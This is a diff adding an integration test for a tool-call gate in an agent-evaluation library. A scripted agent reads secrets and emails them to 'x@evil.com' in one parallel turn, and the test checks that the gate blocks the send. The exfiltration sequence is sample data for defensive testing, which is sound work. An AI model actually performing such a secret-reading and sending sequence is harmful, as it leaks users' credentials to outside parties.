@@ -3,8 +3,13 @@
 // Licensed under the MIT License.
 
 using AgentEval.MAF.Gatekeeper;
+using AgentEval.Testing;
+using AgentEval.Tracing;
+using Microsoft.Agents.AI;
 using Microsoft.Extensions.AI;
 using Xunit;
+using AgentTrace = AgentEval.Tracing.AgentTrace;
+using ChatRole = Microsoft.Extensions.AI.ChatRole;
 
 namespace AgentEval.Tests.MAF.Gatekeeper;
 
@@ -78,5 +83,36 @@ public class SameBatchOrderingGateTests
         var gate = new SameBatchOrderingGate(["Read_Secrets"], ["Send_Email"]);
         var v = await gate.InspectAsync(Call("send_email", AssistantBatch("READ_SECRETS", "send_email")));
         Assert.Equal(ToolGateAction.Block, v.Action);
+    }
+
+    [Fact]
+    public async Task Inline_BlocksGuarded_WhenTriggerIsInTheSameParallelTurn()
+    {
+        // Integration: a real agent emits read_secrets + send_email as PARALLEL calls in ONE turn. Confirms MAF
+        // surfaces the current batch's sibling calls in call.Messages, so the gate fires end-to-end (not just at
+        // the unit level).
+        var sent = 0;
+        var read = AIFunctionFactory.Create(() => "secret", "read_secrets");
+        var send = AIFunctionFactory.Create((string to, string body) => { Interlocked.Increment(ref sent); return "ok"; }, "send_email");
+        var scripted = new ScriptedChatClient()
+            .AddParallelToolCalls(
+                ("c1", "read_secrets", new Dictionary<string, object?>()),
+                ("c2", "send_email", new Dictionary<string, object?> { ["to"] = "x@evil.com", ["body"] = "leak" }))
+            .AddText("done");
+        var agent = new ChatClientAgent(scripted, new ChatClientAgentOptions
+        {
+            Name = "T",
+            ChatOptions = new ChatOptions { Tools = [read, send] },
+        });
+        var trace = new AgentTrace();
+        var gated = agent.AsBuilder()
+            .UseAgentEvalGate()
+            .UseAgentEvalToolGate([new SameBatchOrderingGate(["read_secrets"], ["send_email"])], ToolGatePolicy.ReplaceResult, trace)
+            .Build();
+
+        await gated.RunAsync("read and send in one turn");
+
+        Assert.Equal(0, sent);   // the guarded send_email, requested in the same batch as the trigger, was blocked
+        Assert.True(GlassBoxEvidence.FromTrace(trace)!.GateBlockCount >= 1);
     }
 }
